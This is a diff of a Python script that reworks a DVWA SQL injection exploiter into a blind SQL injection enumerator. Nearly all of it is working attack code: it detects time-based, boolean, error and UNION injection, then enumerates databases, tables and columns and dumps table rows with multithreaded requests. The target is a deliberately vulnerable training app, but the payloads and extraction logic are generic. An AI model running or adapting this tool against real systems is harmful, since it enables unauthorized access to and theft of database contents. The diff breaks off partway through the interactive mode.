@@ -1,439 +1,297 @@
 #!/usr/bin/env python3
-"""
-DVWA SQL Injection Exploiter - Full Version
-Supports: Low, Medium, High security levels
-Author: Security Researcher
-Version: 2.0
-"""
-
 import requests
 import time
 import sys
 import concurrent.futures
 import argparse
-import re
 from threading import Lock
-from urllib.parse import urljoin
-from bs4 import BeautifulSoup
+from urllib.parse import quote
 
-class DVWASQLiExploiter:
-    def __init__(self, base_url, cookies, security_level='low', threads=10):
-        """
-        Initialize the SQLi exploiter for DVWA
-        
-        Args:
-            base_url (str): Base URL of DVWA
-            cookies (dict): Session cookies
-            security_level (str): 'low', 'medium', or 'high'
-            threads (int): Number of concurrent threads
-        """
+class BlindSQLiEnumerator:
+    def __init__(self, base_url, cookies, threads=10):
         self.base_url = base_url.rstrip('/')
         self.cookies = cookies
-        self.security_level = security_level.lower()
+        self.target_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
+        self.session = requests.Session()
+        self.delay_time = 1
         self.threads = threads
         self.lock = Lock()
-        self.session = requests.Session()
-        self.csrf_token = None
-        self.user_token = None
+        self.injection_type = None  # 'time', 'boolean', 'error', 'content'
+        self.true_indicator = None
+        self.false_indicator = None
+        self.error_indicator = None
         
-        # Configure based on security level
-        if self.security_level == 'low':
-            self.target_url = f"{self.base_url}/vulnerabilities/sqli/"
-            self.blind_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
-            self.method = "GET"
-            self.param_type = "query"
-        elif self.security_level == 'medium':
-            self.target_url = f"{self.base_url}/vulnerabilities/sqli/"
-            self.blind_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
-            self.method = "POST"
-            self.param_type = "form"
-        elif self.security_level == 'high':
-            self.target_url = f"{self.base_url}/vulnerabilities/sqli/"
-            self.blind_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
-            self.method = "GET"
-            self.param_type = "session"
-        else:
-            raise ValueError("Security level must be 'low', 'medium', or 'high'")
-        
-        # Configure session
+        # Optimize session
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
             'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
         })
-        
-        # Update cookies
-        self.session.cookies.update(cookies)
-        
-        print(f"[*] Initialized for DVWA {self.security_level.upper()} security level")
-        print(f"[*] Target URL: {self.target_url}")
-        print(f"[*] Method: {self.method}")
     
-    def fetch_csrf_token(self, url=None):
-        """Extract CSRF token from DVWA page"""
-        if url is None:
-            url = self.target_url
+    def detect_injection_type(self):
+        """Detect what type of blind SQL injection is possible"""
+        print("[*] Detecting blind SQL injection type...")
         
-        try:
-            response = self.session.get(url, timeout=10)
-            response.raise_for_status()
+        # Get baseline response for true and false
+        baseline_true, _ = self.send_request("1")
+        baseline_false, _ = self.send_request("999999")
+        
+        if baseline_true and baseline_false:
+            self.true_indicator = baseline_true.text
+            self.false_indicator = baseline_false.text
+        
+        tests = [
+            # Time-based tests
+            ("time", "1' AND SLEEP(1)-- -", "1' AND SLEEP(0.1)-- -"),
+            ("time", "1' OR SLEEP(1)-- -", "1' OR SLEEP(0.1)-- -"),
+            ("time", "1') AND SLEEP(1)-- -", "1') AND SLEEP(0.1)-- -"),
             
-            # Look for CSRF token in various forms
-            soup = BeautifulSoup(response.text, 'html.parser')
+            # Boolean-based tests
+            ("boolean", "1' AND '1'='1", "1' AND '1'='2"),
+            ("boolean", "1' OR '1'='1", "1' OR '1'='2"),
+            ("boolean", "1') AND ('1'='1", "1') AND ('1'='2"),
             
-            # Check for user_token input (common in DVWA)
-            user_token_input = soup.find('input', {'name': 'user_token'})
-            if user_token_input and user_token_input.get('value'):
-                self.user_token = user_token_input.get('value')
-                print(f"[+] Found user_token: {self.user_token}")
+            # Error-based tests
+            ("error", "1' AND EXTRACTVALUE(0,CONCAT(0x7e,USER()))-- -", "1"),
+            ("error", "1' AND UPDATEXML(0,CONCAT(0x7e,USER()),0)-- -", "1"),
             
-            # Check for CSRF token in meta tags or inputs
-            meta_csrf = soup.find('meta', {'name': 'csrf-token'})
-            if meta_csrf and meta_csrf.get('content'):
-                self.csrf_token = meta_csrf.get('content')
+            # Content-based (different content length)
+            ("content", "1' UNION SELECT 1,2-- -", "999999"),
+            ("content", "1' UNION ALL SELECT 1,2-- -", "999999"),
+        ]
+        
+        for inj_type, true_payload, false_payload in tests:
+            print(f"  Testing {inj_type}-based...")
             
-            # Also check for hidden inputs with token in name
-            for input_tag in soup.find_all('input', type='hidden'):
-                if 'token' in input_tag.get('name', '').lower():
-                    self.csrf_token = input_tag.get('value')
-                    print(f"[+] Found CSRF token: {self.csrf_token}")
-                    break
-            
-            return response.text
-            
-        except Exception as e:
-            print(f"[!] Error fetching CSRF token: {e}")
-            return None
+            if inj_type == "time":
+                response_true, time_true = self.send_request(true_payload)
+                response_false, time_false = self.send_request(false_payload)
+                
+                if response_true and response_false:
+                    if time_true >= self.delay_time * 0.8 and time_false < self.delay_time * 0.8:
+                        print(f"[+] {inj_type.upper()}-based injection detected!")
+                        self.injection_type = "time"
+                        return True
+                        
+            elif inj_type == "boolean":
+                response_true, _ = self.send_request(true_payload)
+                response_false, _ = self.send_request(false_payload)
+                
+                if response_true and response_false:
+                    # Check for differences in response
+                    if self.check_boolean_difference(response_true.text, response_false.text):
+                        print(f"[+] {inj_type.upper()}-based injection detected!")
+                        self.injection_type = "boolean"
+                        return True
+                        
+            elif inj_type == "error":
+                response, _ = self.send_request(true_payload)
+                if response and self.check_error_response(response.text):
+                    print(f"[+] {inj_type.upper()}-based injection detected!")
+                    self.injection_type = "error"
+                    self.error_indicator = self.extract_error_indicator(response.text)
+                    return True
+                    
+            elif inj_type == "content":
+                response_true, _ = self.send_request(true_payload)
+                response_false, _ = self.send_request(false_payload)
+                
+                if response_true and response_false:
+                    if self.check_content_difference(response_true.text, response_false.text):
+                        print(f"[+] {inj_type.upper()}-based injection detected!")
+                        self.injection_type = "content"
+                        return True
+        
+        print("[-] No blind SQL injection detected")
+        return False
     
-    def send_payload(self, payload, blind=False):
-        """
-        Send SQL injection payload based on security level
+    def check_boolean_difference(self, response1, response2):
+        """Check if two responses are different (for boolean-based)"""
+        # Simple checks for differences
+        if len(response1) != len(response2):
+            return True
         
-        Args:
-            payload (str): SQL injection payload
-            blind (bool): Whether to use blind SQLi page
+        # Check for specific strings that indicate true/false
+        true_markers = ["exists", "found", "success", "user id", "first name", "surname"]
+        false_markers = ["missing", "not found", "error", "no results"]
         
-        Returns:
-            tuple: (response_text, response_time)
-        """
-        target_url = self.blind_url if blind else self.target_url
-        response_time = 0
+        for marker in true_markers:
+            if marker in response1.lower() and marker not in response2.lower():
+                return True
         
-        try:
-            start_time = time.time()
-            
-            if self.security_level == 'low':
-                if self.method == "GET":
-                    params = {"id": payload, "Submit": "Submit"}
-                    if blind:
-                        params = {"id": payload, "Submit": "Submit"}
-                    response = self.session.get(
-                        target_url,
-                        params=params,
-                        timeout=10
-                    )
-                else:
-                    data = {"id": payload, "Submit": "Submit"}
-                    response = self.session.post(
-                        target_url,
-                        data=data,
-                        timeout=10
-                    )
-            
-            elif self.security_level == 'medium':
-                # Medium uses POST with dropdown/select
-                data = {"id": payload, "Submit": "Submit"}
-                
-                # Add CSRF token if available
-                if self.csrf_token:
-                    data['token'] = self.csrf_token
-                if self.user_token:
-                    data['user_token'] = self.user_token
-                
-                response = self.session.post(
-                    target_url,
-                    data=data,
-                    timeout=10
-                )
-            
-            elif self.security_level == 'high':
-                # High uses session-based ID, need to set it first
-                # First visit the page to get session setup
-                if not self.csrf_token:
-                    self.fetch_csrf_token(target_url)
-                
-                # High level often requires setting session via one page
-                # then querying via another
-                if blind:
-                    # For blind SQLi high, we need to use the separate page
-                    setup_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
-                    setup_data = {"id": payload, "Submit": "Submit"}
-                    
-                    if self.user_token:
-                        setup_data['user_token'] = self.user_token
-                    
-                    # First set the ID in session
-                    self.session.post(setup_url, data=setup_data, timeout=10)
-                    
-                    # Then check the result
-                    check_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
-                    response = self.session.get(check_url, timeout=10)
-                else:
-                    # For regular SQLi high
-                    data = {"id": payload, "Submit": "Submit"}
-                    
-                    if self.user_token:
-                        data['user_token'] = self.user_token
-                    
-                    response = self.session.post(
-                        f"{self.base_url}/vulnerabilities/sqli/",
-                        data=data,
-                        timeout=10
-                    )
-            
-            response_time = time.time() - start_time
-            return response.text, response_time
-            
-        except Exception as e:
-            print(f"[!] Error sending payload: {e}")
-            return None, 0
-    
-    def test_boolean_based(self, payload_true, payload_false):
-        """Test for boolean-based SQL injection"""
-        print("[*] Testing boolean-based injection...")
+        for marker in false_markers:
+            if marker in response2.lower() and marker not in response1.lower():
+                return True
         
-        response_true, _ = self.send_payload(payload_true)
-        response_false, _ = self.send_payload(payload_false)
-        
-        if response_true and response_false:
-            # Check for differences in responses
-            diff_count = self.compare_responses(response_true, response_false)
-            if diff_count > 0:
-                print(f"[+] Boolean-based possible (differences: {diff_count})")
+        # If responses are substantially different
+        if response1 != response2:
+            diff_count = sum(1 for a, b in zip(response1, response2) if a != b)
+            if diff_count > 10:  # More than 10 characters different
                 return True
         
         return False
     
-    def test_time_based(self, payload_sleep, payload_no_sleep, threshold=1):
-        """Test for time-based SQL injection"""
-        print("[*] Testing time-based injection...")
+    def check_error_response(self, response):
+        """Check if response contains SQL error"""
+        error_keywords = [
+            "sql", "mysql", "syntax", "error", "warning", "exception",
+            "xp_", "extractvalue", "updatexml", "~", "concat"
+        ]
         
-        _, time_sleep = self.send_payload(payload_sleep)
-        _, time_no_sleep = self.send_payload(payload_no_sleep)
-        
-        if time_sleep >= threshold and time_no_sleep < threshold:
-            print(f"[+] Time-based possible (sleep: {time_sleep:.2f}s, normal: {time_no_sleep:.2f}s)")
-            return True
-        
-        return False
+        response_lower = response.lower()
+        return any(keyword in response_lower for keyword in error_keywords)
     
-    def test_error_based(self, payload_error):
-        """Test for error-based SQL injection"""
-        print("[*] Testing error-based injection...")
+    def extract_error_indicator(self, response):
+        """Extract error message pattern for error-based injection"""
+        # Look for common error patterns
+        import re
         
-        response, _ = self.send_payload(payload_error)
+        patterns = [
+            r"XPATH syntax error: '([^']+)'",
+            r"~([^<]+)",
+            r"SQLSTATE\[\d+\]:? ([^<]+)",
+            r"error.*?: ([^<]+)",
+        ]
         
-        if response:
-            error_patterns = [
-                r"SQL syntax.*MySQL",
-                r"Warning.*mysql",
-                r"MySQL.*error",
-                r"SQLSTATE",
-                r"syntax error",
-                r"unexpected token",
-                r"You have an error in your SQL syntax"
-            ]
-            
-            for pattern in error_patterns:
-                if re.search(pattern, response, re.IGNORECASE):
-                    print("[+] Error-based possible")
-                    return True
+        for pattern in patterns:
+            match = re.search(pattern, response, re.IGNORECASE)
+            if match:
+                return match.group(1)[:50]  # Return first 50 chars
         
-        return False
+        # If no pattern matches, use a substring
+        return response[response.find("error"):response.find("error")+100] if "error" in response.lower() else "error_detected"
     
-    def test_union_based(self):
-        """Test for union-based SQL injection"""
-        print("[*] Testing union-based injection...")
+    def check_content_difference(self, response1, response2):
+        """Check if content is different (for content-based/union)"""
+        return response1 != response2
+    
+    def send_request(self, payload, timeout=8):
+        """Send request and return response + time"""
+        params = {"id": payload, "Submit": "Submit"}
         
-        # Test for number of columns using ORDER BY
-        for i in range(1, 15):
-            payload = f"1' ORDER BY {i}-- -"
-            response, _ = self.send_payload(payload)
+        try:
+            start = time.time()
+            response = self.session.get(
+                self.target_url,
+                params=params,
+                cookies=self.cookies,
+                timeout=timeout,
+                allow_redirects=False
+            )
+            elapsed = time.time() - start
+            return response, elapsed
+        except Exception as e:
+            with self.lock:
+                print(f"[!] Request error: {e}")
+            return None, 0
+    
+    def test_condition(self, condition):
+        """Test a boolean condition based on detected injection type"""
+        
+        if self.injection_type == "time":
+            payload = f"1' AND IF({condition},SLEEP({self.delay_time}),0)-- -"
+            _, elapsed = self.send_request(payload)
+            return elapsed >= self.delay_time * 0.8
             
-            if response and "Unknown column" in response:
-                num_columns = i - 1
-                print(f"[+] Union-based possible with {num_columns} columns")
+        elif self.injection_type == "boolean":
+            true_payload = f"1' AND {condition}-- -"
+            false_payload = f"1' AND NOT({condition})-- -"
+            
+            response_true, _ = self.send_request(true_payload)
+            response_false, _ = self.send_request(false_payload)
+            
+            if response_true and response_false:
+                return self.check_boolean_difference(response_true.text, response_false.text)
                 
-                # Try to find string columns
-                for col in range(1, num_columns + 1):
-                    nulls = ["NULL"] * num_columns
-                    nulls[col-1] = "'test'"
-                    payload = f"1' UNION SELECT {','.join(nulls)}-- -"
-                    response, _ = self.send_payload(payload)
-                    
-                    if response and "test" in response:
-                        print(f"[+] String column at position {col}")
-                        return True, num_columns, col
-        
-        return False, 0, 0
-    
-    def compare_responses(self, resp1, resp2):
-        """Compare two HTML responses for differences"""
-        # Extract visible text for comparison
-        def extract_text(html):
-            soup = BeautifulSoup(html, 'html.parser')
-            # Remove scripts and styles
-            for script in soup(["script", "style"]):
-                script.decompose()
-            return soup.get_text().strip()
-        
-        text1 = extract_text(resp1)
-        text2 = extract_text(resp2)
-        
-        # Simple difference count
-        diff_count = sum(1 for a, b in zip(text1[:500], text2[:500]) if a != b)
-        return diff_count
-    
-    def detect_injection_type(self):
-        """Detect what types of SQL injection are possible"""
-        print("\n" + "="*60)
-        print("[*] DETECTING SQL INJECTION VULNERABILITIES")
-        print("="*60)
-        
-        injection_types = []
-        
-        # Test different payloads based on security level
-        if self.security_level == 'low':
-            # Test boolean-based
-            if self.test_boolean_based("1' AND '1'='1", "1' AND '1'='2"):
-                injection_types.append("boolean")
+        elif self.injection_type == "error":
+            payload = f"1' AND IF({condition},EXTRACTVALUE(0,CONCAT(0x7e,USER())),0)-- -"
+            response, _ = self.send_request(payload)
             
-            # Test time-based
-            if self.test_time_based("1' AND SLEEP(2)-- -", "1' AND SLEEP(0)-- -", 1.5):
-                injection_types.append("time")
-            
-            # Test error-based
-            if self.test_error_based("1' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))-- -"):
-                injection_types.append("error")
-            
-            # Test union-based
-            union_possible, num_cols, str_col = self.test_union_based()
-            if union_possible:
-                injection_types.append("union")
-                self.num_columns = num_cols
-                self.string_column = str_col
-        
-        elif self.security_level == 'medium':
-            # Medium often uses numeric IDs, adjust payloads
-            if self.test_boolean_based("1 AND 1=1", "1 AND 1=2"):
-                injection_types.append("boolean")
-            
-            if self.test_time_based("1 AND SLEEP(2)-- ", "1 AND SLEEP(0)-- ", 1.5):
-                injection_types.append("time")
-        
-        elif self.security_level == 'high':
-            # High level requires different approach
-            print("[*] High security level - using specialized tests")
-            
-            # Try session-based injection
-            if self.test_time_based("1' AND SLEEP(2)#", "1' AND SLEEP(0)#", 1.5):
-                injection_types.append("time")
-            
-            # Try with different comment syntax
-            if self.test_boolean_based("1' AND '1'='1'#", "1' AND '1'='2'#"):
-                injection_types.append("boolean")
-        
-        if injection_types:
-            print(f"\n[+] Detected injection types: {', '.join(injection_types)}")
-            return injection_types
-        else:
-            print("\n[-] No SQL injection vulnerabilities detected")
-            return []
-    
-    def extract_data_union(self, query, limit=10):
-        """Extract data using UNION technique"""
-        print(f"[*] Extracting data with UNION: {query[:50]}...")
-        
-        nulls = ["NULL"] * self.num_columns
-        nulls[self.string_column - 1] = f"({query})"
-        
-        payload = f"1' UNION SELECT {','.join(nulls)} LIMIT {limit}-- -"
-        response, _ = self.send_payload(payload)
-        
-        if response:
-            # Parse response to extract data
-            soup = BeautifulSoup(response, 'html.parser')
-            
-            # Look for data in pre tags (common in DVWA)
-            pre_tags = soup.find_all('pre')
-            for pre in pre_tags:
-                text = pre.get_text().strip()
-                if text and len(text) > 1 and text != "User ID:":
-                    return text
-            
-            # Look for data in tables
-            tables = soup.find_all('table')
-            for table in tables:
-                rows = table.find_all('tr')
-                for row in rows[1:]:  # Skip header
-                    cols = row.find_all('td')
-                    if len(cols) >= 2:
-                        return cols[1].get_text().strip()
-        
-        return None
-    
-    def blind_extract_char(self, query, position, method="binary"):
-        """Extract single character using blind technique"""
-        if method == "binary":
-            # Binary search (fast)
-            low, high = 32, 126
-            
-            while low <= high:
-                mid = (low + high) // 2
+            if response:
+                return self.check_error_response(response.text)
                 
-                # Test if char >= mid
-                payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))>={mid}-- -"
-                response_true, _ = self.send_payload(payload, blind=True)
+        elif self.injection_type == "content":
+            payload = f"1' AND {condition}-- -"
+            response, _ = self.send_request(payload)
+            baseline, _ = self.send_request("1")
+            
+            if response and baseline:
+                return response.text != baseline.text
+        
+        # Fallback to time-based if detection failed
+        print("[*] Using fallback time-based method")
+        payload = f"1' AND IF({condition},SLEEP({self.delay_time}),0)-- -"
+        _, elapsed = self.send_request(payload)
+        return elapsed >= self.delay_time * 0.8
+    
+    def binary_search_char(self, query, position):
+        """Binary search for character"""
+        low, high = 32, 126
+        
+        while low <= high:
+            mid = (low + high) // 2
+            
+            # Test if char >= mid
+            condition1 = f"ASCII(SUBSTRING(({query}),{position},1))>={mid}"
+            
+            if self.test_condition(condition1):
+                # Test if char == mid
+                condition2 = f"ASCII(SUBSTRING(({query}),{position},1))={mid}"
                 
-                if response_true and "exists" in response_true.lower():
-                    # Char >= mid, test if char == mid
-                    payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))={mid}-- -"
-                    response_eq, _ = self.send_payload(payload, blind=True)
-                    
-                    if response_eq and "exists" in response_eq.lower():
-                        return chr(mid)
-                    else:
-                        low = mid + 1
+                if self.test_condition(condition2):
+                    return chr(mid)
                 else:
-                    high = mid - 1
-        
-        elif method == "linear":
-            # Linear search (slow but reliable)
-            for ascii_val in range(32, 127):
-                payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_val}-- -"
-                response, _ = self.send_payload(payload, blind=True)
-                
-                if response and "exists" in response.lower():
-                    return chr(ascii_val)
+                    low = mid + 1
+            else:
+                high = mid - 1
         
         return None
     
-    def blind_extract_data(self, query, max_length=100):
-        """Extract data using blind SQL injection"""
-        print(f"[*] Blind extracting: {query[:50]}...")
+    def extract_char_parallel(self, query, position):
+        """Extract single character using parallel requests"""
+        chars = []
         
+        def test_char(ascii_val):
+            condition = f"ASCII(SUBSTRING(({query}),{position},1))={ascii_val}"
+            if self.test_condition(condition):
+                return chr(ascii_val)
+            return None
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
+            ascii_range = list(range(32, 127))
+            future_to_char = {executor.submit(test_char, asc): asc for asc in ascii_range}
+            
+            for future in concurrent.futures.as_completed(future_to_char):
+                result = future.result()
+                if result:
+                    chars.append(result)
+                    # Cancel remaining futures
+                    for f in future_to_char:
+                        f.cancel()
+                    break
+        
+        return chars[0] if chars else None
+    
+    def extract_data(self, query, method="binary"):
+        """Extract data with chosen method"""
         result = ""
         position = 1
         
-        # First, get length if needed
-        length_payload = f"1' AND LENGTH(({query}))>0-- -"
-        response, _ = self.send_payload(length_payload, blind=True)
+        print(f"[*] Extracting: {query[:50]}...")
         
         while True:
-            char = self.blind_extract_char(query, position, method="binary")
+            if method == "binary":
+                char = self.binary_search_char(query, position)
+            elif method == "parallel":
+                char = self.extract_char_parallel(query, position)
+            else:  # hybrid
+                start_time = time.time()
+                char = self.binary_search_char(query, position)
+                if time.time() - start_time > 2:
+                    print(f"[*] Switching to parallel for position {position}")
+                    char = self.extract_char_parallel(query, position)
+            
             if not char:
                 break
             
@@ -441,7 +299,7 @@ class DVWASQLiExploiter:
             sys.stdout.write(f"\r[+] Progress: {position} chars -> '{result}'")
             sys.stdout.flush()
             
-            if len(result) >= max_length:
+            if len(result) > 1000 or (',' in result and len(result.split(',')) > 50):
                 break
             
             position += 1
@@ -449,344 +307,319 @@ class DVWASQLiExploiter:
         print()
         return result
     
+    def test_union_columns(self):
+        """Test for UNION-based injection and find number of columns"""
+        print("[*] Testing for UNION-based injection...")
+        
+        for num_cols in range(1, 15):
+            # Test with NULL values
+            nulls = ",".join(["NULL"] * num_cols)
+            payload = f"1' UNION SELECT {nulls}-- -"
+            
+            response, _ = self.send_request(payload)
+            if response and response.status_code == 200:
+                # Check if response is different from error
+                error_payload = f"999999' UNION SELECT {nulls}-- -"
+                error_response, _ = self.send_request(error_payload)
+                
+                if error_response and response.text != error_response.text:
+                    print(f"[+] UNION injection possible with {num_cols} columns")
+                    
+                    # Try to find string column
+                    for i in range(1, num_cols + 1):
+                        test_payload = f"1' UNION SELECT {','.join(['NULL']*(i-1) + ['\'test\''] + ['NULL']*(num_cols-i))}-- -"
+                        test_response, _ = self.send_request(test_payload)
+                        
+                        if test_response and "test" in test_response.text:
+                            print(f"[+] String column at position {i}")
+                            return num_cols, i
+        
+        print("[-] UNION injection not detected or requires different approach")
+        return None, None
+    
+    def union_extract(self, query, num_cols, string_col):
+        """Extract data using UNION technique"""
+        print(f"[*] Using UNION technique to extract data...")
+        
+        # Create payload with query in string column
+        columns = []
+        for i in range(1, num_cols + 1):
+            if i == string_col:
+                columns.append(f"({query})")
+            else:
+                columns.append("NULL")
+        
+        payload = f"1' UNION SELECT {','.join(columns)}-- -"
+        response, _ = self.send_request(payload)
+        
+        if response:
+            # Try to extract the data from response
+            # This is a simple extraction - would need customization per target
+            lines = response.text.split('\n')
+            for line in lines:
+                if 'user id' in line.lower() or 'surname' in line.lower():
+                    # Look for the extracted data
+                    import re
+                    # Try to find patterns that might be our data
+                    patterns = [
+                        r">([^<]+)</pre>",
+                        r"<br />([^<]+)",
+                        r" : ([^<]+)"
+                    ]
+                    
+                    for pattern in patterns:
+                        matches = re.findall(pattern, line)
+                        for match in matches:
+                            if len(match) > 3 and not match.strip().isdigit():
+                                return match.strip()
+        
+        return None
+    
     def get_database_info(self):
-        """Extract database information"""
+        """Get database information"""
         print("\n" + "="*60)
-        print("[*] EXTRACTING DATABASE INFORMATION")
+        print("[*] DATABASE ENUMERATION")
         print("="*60)
         
-        info = {}
-        
-        # Test if UNION is available
-        injection_types = self.detect_injection_type()
-        
-        if "union" in injection_types:
-            print("[*] Using UNION-based extraction")
+        # Try UNION first if available
+        num_cols, string_col = self.test_union_columns()
+        if num_cols and string_col:
+            print("[*] Attempting UNION-based extraction...")
             
-            queries = {
-                "version": "@@version",
-                "database": "database()",
-                "user": "user()",
-                "hostname": "@@hostname"
-            }
-            
-            for key, query in queries.items():
-                result = self.extract_data_union(query)
-                if result:
-                    info[key] = result
-                    print(f"[+] {key}: {result}")
-        
-        else:
-            print("[*] Using blind extraction")
-            
-            # Use blind SQLi
             queries = [
-                ("version", "@@version"),
-                ("database", "database()"),
-                ("user", "user()")
+                ("Version", "@@version"),
+                ("Database", "database()"),
+                ("User", "USER()"),
+                ("Hostname", "@@hostname")
             ]
             
-            for key, query in queries:
-                result = self.blind_extract_data(query)
+            for name, query in queries:
+                result = self.union_extract(query, num_cols, string_col)
                 if result:
-                    info[key] = result
-                    print(f"[+] {key}: {result}")
+                    print(f"[+] {name}: {result}")
+                else:
+                    # Fallback to blind extraction
+                    print(f"[*] Falling back to blind extraction for {name}...")
+                    result = self.extract_data(query, method="parallel")
+                    if result:
+                        print(f"[+] {name}: {result}")
+        else:
+            # Use blind technique
+            print("[*] Using blind extraction technique...")
+            
+            bulk_query = """
+            SELECT CONCAT_WS('|', 
+                @@version, 
+                database(),
+                USER(),
+                @@hostname
+            )
+            """
+            
+            print("[*] Extracting bulk info...")
+            bulk_result = self.extract_data(bulk_query, method="parallel")
+            
+            if bulk_result and '|' in bulk_result:
+                parts = bulk_result.split('|')
+                if len(parts) >= 4:
+                    print(f"\n[+] Database Version: {parts[0]}")
+                    print(f"[+] Current Database: {parts[1]}")
+                    print(f"[+] Current User: {parts[2]}")
+                    print(f"[+] Hostname: {parts[3]}")
+                    return parts
         
-        return info
+        return []
     
     def get_databases(self):
-        """Get list of databases"""
-        print("\n[*] Extracting database list...")
+        """Get all databases"""
+        print("\n[*] Extracting all databases...")
         
-        query = "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"
-        result = self.blind_extract_data(query)
+        query = "SELECT GROUP_CONCAT(schema_name SEPARATOR '|||') FROM information_schema.schemata"
+        result = self.extract_data(query, method="parallel")
         
         if result:
-            databases = [db.strip() for db in result.split(',') if db.strip()]
+            databases = [db for db in result.split('|||') if db]
             print(f"[+] Found {len(databases)} databases")
-            for i, db in enumerate(databases, 1):
-                print(f"  {i}. {db}")
             return databases
-        
         return []
     
     def get_tables(self, database):
-        """Get tables from a database"""
-        print(f"\n[*] Extracting tables from '{database}'...")
+        """Get tables from database"""
+        print(f"[*] Extracting tables from '{database}'...")
         
-        query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{database}'"
-        result = self.blind_extract_data(query)
+        query = f"SELECT GROUP_CONCAT(table_name SEPARATOR '|||') FROM information_schema.tables WHERE table_schema='{database}'"
+        result = self.extract_data(query, method="parallel")
         
         if result:
-            tables = [tbl.strip() for tbl in result.split(',') if tbl.strip()]
+            tables = [tbl for tbl in result.split('|||') if tbl]
             print(f"[+] Found {len(tables)} tables in '{database}'")
-            for i, tbl in enumerate(tables, 1):
-                print(f"  {i}. {tbl}")
             return tables
-        
         return []
     
     def get_columns(self, database, table):
-        """Get columns from a table"""
-        print(f"\n[*] Extracting columns from '{database}.{table}'...")
+        """Get columns from table"""
+        print(f"[*] Extracting columns from '{database}.{table}'...")
         
-        query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
-        result = self.blind_extract_data(query)
+        query = f"""
+        SELECT GROUP_CONCAT(column_name SEPARATOR '|||') 
+        FROM information_schema.columns 
+        WHERE table_schema='{database}' AND table_name='{table}'
+        """
+        result = self.extract_data(query, method="parallel")
         
         if result:
-            columns = [col.strip() for col in result.split(',') if col.strip()]
+            columns = [col for col in result.split('|||') if col]
             print(f"[+] Found {len(columns)} columns in '{table}'")
-            for i, col in enumerate(columns, 1):
-                print(f"  {i}. {col}")
             return columns
-        
         return []
     
-    def dump_table(self, database, table, columns, limit=5):
-        """Dump data from a table"""
+    def dump_data(self, database, table, columns, limit=10):
+        """Dump data from table"""
         print(f"\n[*] Dumping data from '{database}.{table}'...")
         
-        # Build query with specified columns
-        cols_str = ", ".join(columns)
-        query = f"SELECT CONCAT_WS('|', {cols_str}) FROM {database}.{table} LIMIT {limit}"
+        columns_str = ', '.join(columns)
+        query = f"""
+        SELECT GROUP_CONCAT(CONCAT_WS(':::', {columns_str}) SEPARATOR '||||') 
+        FROM {database}.{table} 
+        LIMIT {limit}
+        """
         
-        result = self.blind_extract_data(query, max_length=500)
+        result = self.extract_data(query, method="parallel")
         
         if result:
-            rows = [row.strip() for row in result.split(',') if row.strip()]
-            print(f"\n[+] Dumped {len(rows)} rows:")
-            
-            for i, row in enumerate(rows, 1):
-                values = row.split('|')
-                print(f"\nRow {i}:")
+            rows = result.split('||||')
+            print(f"\n[+] Dumped {len(rows)} rows from '{table}':")
+            for i, row in enumerate(rows):
+                values = row.split(':::')
+                print(f"\nRow {i+1}:")
                 for col, val in zip(columns, values):
-                    print(f"  {col}: {val[:50]}{'...' if len(val) > 50 else ''}")
-        
-        return result
+                    print(f"  {col}: {val}")
+        else:
+            print("[-] Failed to dump data")
     
     def interactive_mode(self):
-        """Interactive exploitation mode"""
+        """Interactive mode"""
         print("\n" + "="*60)
-        print("DVWA SQL INJECTION EXPLOITER - INTERACTIVE MODE")
+        print("BLIND SQL INJECTION ENUMERATOR")
         print("="*60)
         
-        # First, fetch CSRF token if needed
-        if self.security_level in ['medium', 'high']:
-            print("[*] Fetching CSRF tokens...")
-            self.fetch_csrf_token()
-        
-        # Detect injection types
-        injection_types = self.detect_injection_type()
-        if not injection_types:
-            print("\n[!] No SQL injection vulnerabilities found!")
+        # Detect injection type
+        if not self.detect_injection_type():
             return
         
-        # Get database info
-        print("\n[1/7] Getting database information...")
-        db_info = self.get_database_info()
+        print(f"\n[*] Using {self.injection_type.upper()}-based technique")
         
-        if not db_info:
-            print("[!] Failed to get database information")
-            # Try blind extraction as fallback
-            print("[*] Trying blind extraction fallback...")
+        # Get database info
+        print("\n[1/6] Getting database information...")
+        self.get_database_info()
         
         # Get databases
-        print("\n[2/7] Enumerating databases...")
+        print("\n[2/6] Enumerating databases...")
         databases = self.get_databases()
         
         if not databases:
             print("[!] No databases found")
             return
         
-        # Select database
-        print("\n[3/7] Select database:")
+        print("\nDATABASES:")
         for i, db in enumerate(databases, 1):
             print(f"  {i}. {db}")
         
+        # Select database
+        while True:
+            try:
+                choice = input("\n[?] Select database number (or 'all'): ").strip()
+                if choice.lower() == 'all':
+                    selected_dbs = databases
+                    break
+                elif choice.isdigit() and 1 <= int(choice) <= len(databases):
+                    selected_dbs = [databases[int(choice)-1]]
+                    break
+                else:
+                    print(f"[!] Enter 1-{len(databases)} or 'all'")
+            except KeyboardInterrupt:
+                print("\n[!] Interrupted")
+                return
+        
+        # Enumerate tables
+        all_tables = []
+        for db in selected_dbs:
+            print(f"\n[3/6] Enumerating tables in '{db}'...")
+            tables = self.get_tables(db)
+            
+            if tables:
+                print(f"\nTABLES in {db}:")
+                for i, tbl in enumerate(tables, 1):
+                    print(f"  {i}. {tbl}")
+                    all_tables.append((db, tbl))
+        
+        if not all_tables:
+            print("[!] No tables found")
+            return
+        
+        # Select table
+        print("\n[4/6] Select table to examine...")
